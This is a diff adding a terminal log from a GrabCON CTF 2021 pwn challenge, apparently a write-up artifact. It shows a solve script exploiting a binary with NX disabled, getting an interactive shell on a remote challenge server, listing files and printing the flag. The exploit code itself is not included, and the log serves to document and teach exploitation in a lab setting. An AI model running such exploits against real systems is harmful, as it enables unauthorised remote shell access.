@@ -1,0 +1,24 @@
+mito@ubuntu:~/CTF/GrabCON_CTF_2021/Pwn_Pwn_CTF$ python solve.py r
+[*] '/home/mito/CTF/GrabCON_CTF_2021/Pwn_Pwn_CTF/pwn2'
+    Arch:     i386-32-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+[+] Opening connection to 35.246.42.94 on port 1337: Done
+stack_leak = 0xffe623de
+[*] Switching to interactive mode
+
+/bin//sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: not found
+$ ls -l
+total 40
+drwxr-x--- 1 0 1000  4096 Sep  2 17:05 bin
+drwxr-x--- 1 0 1000  4096 Sep  2 17:05 dev
+-rwxr----- 1 0 1000    31 Sep  2 17:04 flag.txt
+drwxr-x--- 1 0 1000  4096 Sep  2 17:05 lib
+drwxr-x--- 1 0 1000  4096 Sep  2 17:05 lib32
+drwxr-x--- 1 0 1000  4096 Sep  2 17:05 lib64
+-rwxr-x--- 1 0 1000 13764 Sep  2 17:04 pwn2
+$ cat flag.txt
+GrabCON{Y0U_g0t_Sh3ll_B4asics}
